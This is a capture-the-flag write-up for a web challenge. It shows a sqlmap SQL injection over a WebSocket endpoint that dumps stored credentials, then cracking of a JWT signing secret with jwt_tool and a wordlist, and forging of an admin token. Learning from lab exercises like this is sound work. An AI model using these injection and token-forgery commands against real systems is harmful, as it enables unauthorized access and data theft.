# CTF Write-Up: [Bug Report Repo]

## Challenge Information

- **Category:** [Web]
- **Points:** [342]
- **Solves:** [64]
- **Author:** [CryptoCat]
- **Challenge Description:** [I started my own bug bounty platform! The UI is in the early stages but we've already got plenty of submissions. I wonder why I keep getting emails about a "critical" vulnerability report though, I don't see it anywhere on the system 😕]

## Solution

### Summary

We can arrange items by ID from 1 to 10.

![bug_repo_1](https://user-images.githubusercontent.com/105972068/285240795-d15025d2-4bdf-4290-81ca-897294c596fa.png)

When We put over the ID

![bug_repo_2](https://user-images.githubusercontent.com/105972068/285240843-c40d3dd6-1bc4-481b-b431-5ae2a6bbd82d.png)

When I try to order with ID 11, I encounter

![bug_repo_3](https://user-images.githubusercontent.com/105972068/285240862-7d213ee0-bdc2-4094-a664-e57fd23f45d5.png)
Does it seem like it comes from the database?

All order IDs are processed using the WebSocket protocol, not the Post method.

![bug_repo_4](https://user-images.githubusercontent.com/105972068/285249312-6d14414d-8d1d-402c-b17c-dedb1978ab35.png)

### Walkthrough

> I discovered this command for the injection. 
> - The original link is "https://bountyrepo.ctf.intigriti.io/". We have to replace "https" with "wss".
> - --data=Data: Data string to be sent through POST (e.g. "id=1")
> - --dbms=DBMS: Force back-end DBMS to provided value
```
sqlmap -u 'wss://bountyrepo.ctf.intigriti.io:443/ws' --random-agent --data '{"id":"11"}' --dbms sqlite --dump --batch
```

*Result:*
![bug_repo_5](https://user-images.githubusercontent.com/105972068/285264202-03df9db2-25e3-4e3f-9aaa-ec6358d2a3b6.png)
```
crypt0:c4tz on /4dm1n_z0n3, really?!
```
> Navigate to /4dm1n_z0n3, and we'll find the login page.
![bug_repo_6](https://user-images.githubusercontent.com/105972068/285264222-564e455e-f2b5-4711-9e7d-4d21b632b936.png)

> Use the credentials "crypt0" for the username and "c4tz" for the password to log in.
![bug_repo_7](https://user-images.githubusercontent.com/105972068/285264227-41da7566-6a52-468f-b39e-50928e115dd6.png)

> After logging in, we received the message **"only viewable by the admin"**.
We also obtained this JWT.
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6ImNyeXB0MCJ9.zbwLInZCdG8Le5iH1fb5GHB5OM4bYOm8d5gZ2AbEu_I
```
> We can use hashcat, john, and jwt_tool to crack this JWT.
But I prefer using jwt_tool.
```
py jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6ImNyeXB0MCJ9.zbwLInZCdG8Le5iH1fb5GHB5OM4bYOm8d5gZ2AbEu_I -C -d C:\Tool_Exe\wordlist\rockyou.txt
```
*secret key:*
<mark>
  catsarethebest
</mark>

> Go to iwt.io, paste the JWT and secret key to see the complete details.
![bug_repo_9](https://user-images.githubusercontent.com/105972068/285272843-fe845d2a-3cce-40e3-b04f-93f04391f752.png)

> Modify this JWT from crpt0 to admin
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6ImNyeXB0MCJ9.zbwLInZCdG8Le5iH1fb5GHB5OM4bYOm8d5gZ2AbEu_I -S hs256 -p catsarethebest -pv admin -I -pc identity
```

*We get admin JWT:*
<mark>
  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6ImFkbWluIn0.3xH8a2FskQJ3afYZeJCtwln4CRrwh4nidEy7S6fJoA0
</mark>

> Update the cookie in our browser, and we'll obtain the flag!
![bug_repo_8](https://user-images.githubusercontent.com/105972068/285264228-90545caf-8b99-478d-a6a1-c06f178f5829.png)



